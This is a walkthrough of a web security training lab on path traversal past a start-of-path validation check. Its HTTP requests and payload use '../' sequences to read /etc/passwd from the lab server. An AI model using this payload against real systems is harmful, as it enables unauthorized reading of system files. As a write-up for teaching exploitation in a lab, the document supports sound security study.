# Lab: File Path Traversal, Validation of Start of Path

## Objective

Exploit the path traversal vulnerability in the product image functionality to retrieve the contents of the `/etc/passwd` file.

## Vulnerability

The application transmits the full file path through a request parameter and validates that the supplied path starts with the expected directory. However, the validation only checks the beginning of the path and does not verify the final resolved location, allowing traversal sequences to escape the intended directory.

## Steps 

1. Open the lab and navigate to any product page.
2. Intercept the request for the product image using **Burp Suite**.
3. Identify the request containing the `filename` parameter.

### Original Request

```http
GET /image?filename=/var/www/images/218.png HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

4. Modify the `filename` parameter to:

```text
/var/www/images/../../../etc/passwd
```

### Modified Request

```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

5. Forward the request.



The server returns the contents of the `/etc/passwd` file, confirming that the application is vulnerable to Path Traversal.



the operating system accesses the `/etc/passwd` file, allowing the attacker to read files outside the intended directory.

## Payload Used

```text
/var/www/images/../../../etc/passwd
```

## Explanation

The application validates that the supplied path starts with:

```text
/var/www/images
```

The payload:

```text
/var/www/images/../../../etc/passwd
```

passes this check because it begins with the expected directory.

However, after resolving the traversal sequences:

```text
/var/www/images/../../../etc/passwd
↓
/etc/passwd
```

